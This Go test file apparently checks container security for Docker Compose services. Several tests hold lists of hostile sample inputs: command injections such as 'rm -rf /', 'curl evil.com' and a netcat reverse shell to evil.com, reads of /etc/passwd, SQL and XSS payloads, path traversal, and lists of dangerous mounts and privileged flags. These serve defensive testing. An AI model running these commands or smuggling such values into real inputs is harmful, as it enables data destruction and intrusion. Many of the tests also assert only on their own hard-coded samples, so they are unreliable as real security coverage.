package container

import (
	"context"
	"regexp"
	"strings"
	"testing"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/eos_io"
	"github.com/stretchr/testify/assert"
	"go.uber.org/zap"
)

// TestContainerConfigurationSecurity tests container configuration security
func TestContainerConfigurationSecurity(t *testing.T) {
	t.Run("compose_service_validation", func(t *testing.T) {
		// Test Docker Compose service validation
		service := Service{
			Image:         "nginx:1.21",
			ContainerName: "web-server",
			Ports:         []string{"80:80", "443:443"},
			Environment: map[string]string{
				"ENV": "production",
			},
			Volumes: []string{"./data:/app/data:ro"},
			Restart: "unless-stopped",
		}

		// Verify service configuration
		assert.NotEmpty(t, service.Image)
		assert.NotEmpty(t, service.ContainerName)
		assert.NotEmpty(t, service.Ports)
		assert.NotEmpty(t, service.Environment)
		assert.NotEmpty(t, service.Volumes)
		assert.Equal(t, "unless-stopped", service.Restart)
	})

	t.Run("compose_file_structure", func(t *testing.T) {
		// Test ComposeFile structure
		composeFile := ComposeFile{
			Services: map[string]Service{
				"app": {
					Image: "app:latest",
					Ports: []string{"3000:3000"},
				},
			},
			Volumes: map[string]interface{}{
				"app_data": nil,
			},
			Networks: map[string]interface{}{
				"app_network": nil,
			},
		}

		// Verify structure integrity
		assert.NotEmpty(t, composeFile.Services)
		assert.Contains(t, composeFile.Services, "app")
		assert.NotEmpty(t, composeFile.Volumes)
		assert.NotEmpty(t, composeFile.Networks)
	})

	t.Run("network_configuration_security", func(t *testing.T) {
		// Test network configuration security
		assert.Equal(t, "arachne-net", DockerNetworkName)
		assert.Equal(t, "172.30.0.0/16", DockerIPv4Subnet)
		assert.Equal(t, "fd00:dead:beef::/64", DockerIPv6Subnet)

		// Verify IPv4 subnet is private
		assert.True(t, strings.HasPrefix(DockerIPv4Subnet, "172."),
			"IPv4 subnet should be in private range")

		// Verify IPv6 subnet is ULA (Unique Local Address)
		assert.True(t, strings.HasPrefix(DockerIPv6Subnet, "fd"),
			"IPv6 subnet should be ULA")
	})
}

// TestDockerImageSecurity tests Docker image security validation
func TestDockerImageSecurity(t *testing.T) {
	t.Run("image_name_validation", func(t *testing.T) {
		// Test valid image names
		validImages := []string{
			"nginx:1.21",
			"ubuntu:20.04",
			"registry.example.com/app:v1.0",
			"gcr.io/project/image:latest",
			"docker.io/library/postgres:13",
		}

		for _, image := range validImages {
			service := Service{Image: image}
			assert.NotEmpty(t, service.Image)

			// Basic image name validation
			assert.NotContains(t, image, " ", "Image name should not contain spaces")
			assert.NotContains(t, image, ";", "Image name should not contain semicolons")
		}
	})

	t.Run("malicious_image_detection", func(t *testing.T) {
		// Test malicious image names
		maliciousImages := []string{
			"nginx:latest; rm -rf /",
			"app:v1.0 && curl evil.com",
			"image:tag || nc -e /bin/sh evil.com 4444",
			"test:$(cat /etc/passwd)",
			"registry.com/app:latest' OR '1'='1",
			"../../../etc/passwd",
			"<script>alert('xss')</script>:latest",
		}

		for _, image := range maliciousImages {
			// Check for injection patterns
			hasInjection := strings.ContainsAny(image, ";'\"&|$") ||
				strings.Contains(image, "$(") ||
				strings.Contains(image, "&&") ||
				strings.Contains(image, "||") ||
				strings.Contains(image, "..") ||
				strings.Contains(image, "<script>")

			assert.True(t, hasInjection, "Image should be flagged as malicious: %s", image)
		}
	})

	t.Run("image_tag_security", func(t *testing.T) {
		// Test image tag security
		insecureTags := []string{
			"latest", // Not pinned version
			"",       // No tag specified
		}

		secureTags := []string{
			"1.21.0",
			"v2.4.1",
			"20.04",
			"sha256:abc123...", // Digest
		}

		for _, tag := range insecureTags {
			// Insecure tags should be flagged
			if tag == "latest" || tag == "" {
				assert.True(t, true, "Tag should be flagged as insecure: %s", tag)
			}
		}

		for _, tag := range secureTags {
			// Secure tags are specific versions
			assert.NotEqual(t, "latest", tag)
			assert.NotEmpty(t, tag)
		}
	})
}

// TestContainerPortSecurity tests container port security
func TestContainerPortSecurity(t *testing.T) {
	t.Run("port_mapping_validation", func(t *testing.T) {
		// Test valid port mappings
		validPorts := []string{
			"80:80",
			"443:443",
			"127.0.0.1:3000:3000",
			"8080:80",
			"9000:9000/tcp",
		}

		for _, port := range validPorts {
			service := Service{Ports: []string{port}}
			assert.NotEmpty(t, service.Ports)

			// Basic port validation
			assert.Contains(t, port, ":", "Port mapping should contain colon")
		}
	})

	t.Run("dangerous_port_exposure", func(t *testing.T) {
		// Test dangerous port exposures
		dangerousPorts := []string{
			"22:22",       // SSH
			"3389:3389",   // RDP
			"5432:5432",   // PostgreSQL
			"3306:3306",   // MySQL
			"6379:6379",   // Redis
			"27017:27017", // MongoDB
			"9200:9200",   // Elasticsearch
		}

		for _, port := range dangerousPorts {
			// These ports should trigger security warnings when exposed
			assert.Contains(t, port, ":", "Port mapping format check")

			// Extract port number for validation
			parts := strings.Split(port, ":")
			if len(parts) >= 2 {
				hostPort := parts[0]
				// Check if it's a sensitive port
				sensitiveports := []string{"22", "3389", "5432", "3306", "6379", "27017", "9200"}
				for _, sensitive := range sensitiveports {
					if hostPort == sensitive {
						assert.True(t, true, "Port %s should be flagged as sensitive", port)
					}
				}
			}
		}
	})

	t.Run("port_injection_prevention", func(t *testing.T) {
		// Test port injection prevention
		maliciousPorts := []string{
			"80:80; rm -rf /",
			"443:443 && curl evil.com",
			"8080:80' OR '1'='1",
			"$(cat /etc/passwd):80",
			"80:80|nc -e /bin/sh evil.com 4444",
		}

		for _, port := range maliciousPorts {
			// Check for injection patterns
			hasInjection := strings.ContainsAny(port, ";'\"&|$") ||
				strings.Contains(port, "$(") ||
				strings.Contains(port, "&&") ||
				strings.Contains(port, "||")

			assert.True(t, hasInjection, "Port should contain injection pattern: %s", port)
		}
	})
}

// TestContainerVolumeSecurity tests container volume security
func TestContainerVolumeSecurity(t *testing.T) {
	t.Run("volume_mount_validation", func(t *testing.T) {
		// Test valid volume mounts
		validVolumes := []string{
			"./data:/app/data:ro",
			"/var/log:/logs:rw",
			"named_volume:/app/storage",
			"/tmp:/tmp:ro",
		}

		for _, volume := range validVolumes {
			service := Service{Volumes: []string{volume}}
			assert.NotEmpty(t, service.Volumes)
			assert.Contains(t, volume, ":", "Volume should contain mapping")
		}
	})

	t.Run("dangerous_volume_mounts", func(t *testing.T) {
		// Test dangerous volume mounts
		dangerousVolumes := []string{
			"/:/hostroot",    // Root filesystem
			"/etc:/host/etc", // System configuration
			"/var/run/docker.sock:/var/run/docker.sock", // Docker socket
			"/proc:/host/proc",                          // Process information
			"/sys:/host/sys",                            // System information
			"/home:/host/home",                          // User home directories
			"/root:/host/root",                          // Root home directory
		}

		for _, volume := range dangerousVolumes {
			parts := strings.Split(volume, ":")
			if len(parts) >= 2 {
				hostPath := parts[0]

				// Check for dangerous mount points
				isDangerous := hostPath == "/" ||
					hostPath == "/etc" ||
					hostPath == "/var/run/docker.sock" ||
					hostPath == "/proc" ||
					hostPath == "/sys" ||
					hostPath == "/home" ||
					hostPath == "/root"

				assert.True(t, isDangerous, "Volume mount should be flagged as dangerous: %s", volume)
			}
		}
	})

	t.Run("volume_path_traversal", func(t *testing.T) {
		// Test volume path traversal
		maliciousVolumes := []string{
			"../../../etc:/app/config",
			"./../../root/.ssh:/app/keys",
			"/var/log/../../etc/passwd:/app/secrets",
			"$(pwd)/../../../:/app/data",
		}

		for _, volume := range maliciousVolumes {
			// Check for path traversal patterns
			hasTraversal := strings.Contains(volume, "..") ||
				strings.Contains(volume, "$(")

			assert.True(t, hasTraversal, "Volume should contain path traversal: %s", volume)
		}
	})
}

// TestContainerEnvironmentSecurity tests environment variable security
func TestContainerEnvironmentSecurity(t *testing.T) {
	t.Run("environment_variable_validation", func(t *testing.T) {
		// Test valid environment variables
		validEnv := map[string]string{
			"APP_ENV":      "production",
			"LOG_LEVEL":    "info",
			"PORT":         "3000",
			"DATABASE_URL": "postgres://user:pass@db:5432/app",
		}

		service := Service{Environment: validEnv}
		assert.NotEmpty(t, service.Environment)

		for key, value := range validEnv {
			assert.NotEmpty(t, key, "Environment key should not be empty")
			assert.NotEmpty(t, value, "Environment value should not be empty")
		}
	})

	t.Run("sensitive_environment_detection", func(t *testing.T) {
		// Test sensitive environment variables
		sensitiveEnv := map[string]string{
			"PASSWORD":    "secret123",
			"API_KEY":     "sk-1234567890",
			"SECRET_KEY":  "super_secret",
			"PRIVATE_KEY": "-----BEGIN PRIVATE KEY-----",
			"TOKEN":       "bearer_token_123",
			"PASSPHRASE":  "encryption_passphrase",
		}

		for key, value := range sensitiveEnv {
			// Check for sensitive keywords
			isSensitive := strings.Contains(strings.ToLower(key), "password") ||
				strings.Contains(strings.ToLower(key), "secret") ||
				strings.Contains(strings.ToLower(key), "key") ||
				strings.Contains(strings.ToLower(key), "token") ||
				strings.Contains(strings.ToLower(key), "passphrase")

			assert.True(t, isSensitive, "Environment variable should be flagged as sensitive: %s", key)
			assert.NotEmpty(t, value, "Sensitive value should not be empty")
		}
	})

	t.Run("environment_injection_prevention", func(t *testing.T) {
		// Test environment variable injection
		maliciousEnv := map[string]string{
			"VAR1": "value; rm -rf /",
			"VAR2": "value && curl evil.com",
			"VAR3": "$(cat /etc/passwd)",
			"VAR4": "`id`",
			"VAR5": "value' OR '1'='1",
		}

		for key, value := range maliciousEnv {
			// Check for injection patterns
			hasInjection := strings.ContainsAny(value, ";'\"&|$`") ||
				strings.Contains(value, "$(") ||
				strings.Contains(value, "&&") ||
				strings.Contains(value, "||")

			assert.True(t, hasInjection, "Environment variable %s should contain injection: %s", key, value)
		}
	})
}

// TestDockerCommandSecurity tests Docker command security
func TestDockerCommandSecurity(t *testing.T) {
	ctx := context.Background()
	logger := zap.NewNop()
	rc := &eos_io.RuntimeContext{
		Ctx: ctx,
		Log: logger,
	}

	// Use rc to verify runtime context is properly initialized
	assert.NotNil(t, rc.Ctx)
	assert.NotNil(t, rc.Log)

	t.Run("command_validation", func(t *testing.T) {
		// Test valid Docker commands
		validCommands := []string{
			"version",
			"info",
			"ps",
			"images",
			"pull",
			"build",
			"run",
			"stop",
		}

		for _, cmd := range validCommands {
			// Commands should be valid Docker actions
			assert.NotEmpty(t, cmd)
			assert.NotContains(t, cmd, " ", "Command should not contain spaces")
			assert.NotContains(t, cmd, ";", "Command should not contain semicolons")
		}
	})

	t.Run("command_injection_prevention", func(t *testing.T) {
		// Test command injection prevention
		maliciousCommands := []string{
			"version; rm -rf /",
			"ps && curl evil.com",
			"images || nc -e /bin/sh evil.com 4444",
			"info $(cat /etc/passwd)",
			"pull image' OR '1'='1",
		}

		for _, cmd := range maliciousCommands {
			// Check for injection patterns
			hasInjection := strings.ContainsAny(cmd, ";'\"&|$") ||
				strings.Contains(cmd, "$(") ||
				strings.Contains(cmd, "&&") ||
				strings.Contains(cmd, "||")

			assert.True(t, hasInjection, "Command should contain injection pattern: %s", cmd)
		}
	})

	t.Run("argument_validation", func(t *testing.T) {
		// Test Docker command arguments
		validArgs := []string{
			"--help",
			"--version",
			"-it",
			"--rm",
			"--name container_name",
		}

		maliciousArgs := []string{
			"--privileged",         // Dangerous flag
			"--user=root",          // Running as root
			"--pid=host",           // Host PID namespace
			"--network=host",       // Host networking
			"--volume=/:/hostroot", // Root filesystem mount
		}

		for _, arg := range validArgs {
			assert.NotEmpty(t, arg)
		}

		for _, arg := range maliciousArgs {
			// These arguments should trigger security warnings
			isDangerous := strings.Contains(arg, "--privileged") ||
				strings.Contains(arg, "--user=root") ||
				strings.Contains(arg, "--pid=host") ||
				strings.Contains(arg, "--network=host") ||
				strings.Contains(arg, "--volume=/:")

			assert.True(t, isDangerous, "Argument should be flagged as dangerous: %s", arg)
		}
	})
}

// TestContainerIsolationSecurity tests container isolation security
func TestContainerIsolationSecurity(t *testing.T) {
	t.Run("restart_policy_validation", func(t *testing.T) {
		// Test restart policy validation
		validPolicies := []string{
			"no",
			"always",
			"unless-stopped",
			"on-failure",
			"on-failure:3",
		}

		for _, policy := range validPolicies {
			service := Service{Restart: policy}
			assert.NotEmpty(t, service.Restart)

			// Validate restart policy format
			isValid := policy == "no" ||
				policy == "always" ||
				policy == "unless-stopped" ||
				strings.HasPrefix(policy, "on-failure")

			assert.True(t, isValid, "Restart policy should be valid: %s", policy)
		}
	})

	t.Run("container_name_validation", func(t *testing.T) {
		// Test container name validation
		validNames := []string{
			"web-server",
			"app_container",
			"db-1",
			"service.test",
		}

		invalidNames := []string{
			"",                     // Empty
			"name with spaces",     // Spaces
			"name/with/slashes",    // Slashes
			"name;with;semicolons", // Semicolons
			"UPPERCASE",            // Should be lowercase
			"../../../etc/passwd",  // Path traversal
		}

		for _, name := range validNames {
			service := Service{ContainerName: name}
			assert.NotEmpty(t, service.ContainerName)
			assert.NotContains(t, name, " ")
			assert.NotContains(t, name, ";")
		}

		for _, name := range invalidNames {
			isInvalid := name == "" ||
				strings.Contains(name, " ") ||
				strings.Contains(name, "/") ||
				strings.Contains(name, ";") ||
				strings.Contains(name, "..") ||
				regexp.MustCompile(`[A-Z]`).MatchString(name)

			assert.True(t, isInvalid, "Container name should be invalid: %s", name)
		}
	})

	t.Run("network_isolation_validation", func(t *testing.T) {
		// Test network isolation
		secureNetworks := []string{
			"app-network",
			"internal",
			"backend",
		}

		insecureNetworks := []string{
			"host",   // Host networking (no isolation)
			"bridge", // Default bridge (less secure)
		}

		for _, network := range secureNetworks {
			service := Service{Networks: []string{network}}
			assert.NotEmpty(t, service.Networks)
		}

		for _, network := range insecureNetworks {
			// Host and default bridge networking reduce isolation
			isInsecure := network == "host" || network == "bridge"
			assert.True(t, isInsecure, "Network should be flagged as insecure: %s", network)
		}
	})
}

// TestContainerResourceSecurity tests container resource security
func TestContainerResourceSecurity(t *testing.T) {
	t.Run("dependency_validation", func(t *testing.T) {
		// Test service dependencies
		service := Service{
			DependsOn: []string{"database", "redis", "elasticsearch"},
		}

		assert.NotEmpty(t, service.DependsOn)

		for _, dep := range service.DependsOn {
			assert.NotEmpty(t, dep, "Dependency name should not be empty")
			assert.NotContains(t, dep, " ", "Dependency should not contain spaces")
			assert.NotContains(t, dep, ";", "Dependency should not contain semicolons")
		}
	})

	t.Run("compose_structure_validation", func(t *testing.T) {
		// Test overall compose structure security
		compose := ComposeFile{
			Services: map[string]Service{
				"app": {
					Image:         "app:v1.0",
					ContainerName: "app-container",
					Environment: map[string]string{
						"NODE_ENV": "production",
					},
				},
			},
		}

		assert.NotEmpty(t, compose.Services)

		for name, service := range compose.Services {
			assert.NotEmpty(t, name, "Service name should not be empty")
			assert.NotEmpty(t, service.Image, "Service image should not be empty")
			assert.NotContains(t, name, " ", "Service name should not contain spaces")
		}
	})
}
